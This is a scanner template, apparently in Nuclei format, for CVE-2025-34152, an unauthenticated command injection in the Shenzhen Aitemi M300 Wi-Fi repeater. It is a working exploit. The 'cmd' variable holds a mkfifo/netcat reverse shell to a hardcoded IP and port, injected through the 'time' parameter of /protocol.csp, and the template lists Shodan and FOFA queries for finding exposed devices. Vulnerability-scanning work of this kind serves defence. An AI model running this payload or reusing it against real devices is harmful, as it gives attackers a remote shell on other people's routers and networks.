id: CVE-2025-34152

info:
  name: Shenzhen Aitemi M300 Wi-Fi Repeater - OS Command Injection
  severity: info
  author: darses
  description: |
    Shenzhen Aitemi M300 Wi-Fi Repeater contains an unauthenticated OS command injection caused by improper handling of the 'time' parameter in the /protocol.csp? endpoint, letting remote attackers execute arbitrary commands without service disruption.
  impact: |
    Remote attackers can execute arbitrary OS commands, potentially leading to full system compromise without service disruption.
  remediation: |
    Update to the latest firmware version provided by the vendor.
  metadata:
    vendor: shenzhen_aitemi
    product: m300
    shodan-query:
      - http.favicon.hash:-741058468 "lighttpd/1.4.32"
      - http.html:"TT_SetWifiExt"
    fofa-query:
      - icon_hash="-741058468" && server=="lighttpd/1.4.32"
      - body="TT_SetWifiExt"
  classification:
    cve-id: CVE-2025-34152
    cwe-id: CWE-78
    cvss-metrics: "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
    cvss-score: 9.4
  reference:
    - https://chocapikk.com/posts/2025/when-a-wifi-name-gives-you-root-part-two/
    - https://www.aliexpress.us/item/3256806767641280.html
  tags: cve,cve2025,iot

variables:
  cmd: mkfifo /tmp/x; nc 192.168.11.208 4444 < /tmp/x | /bin/sh > /tmp/x 2>&1

http:
  - method: POST
    path:
      - "{{BaseURL}}/protocol.csp?"

    body: |
      fname=system&opt=time_conf&function=set&time=$({{cmd}})

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
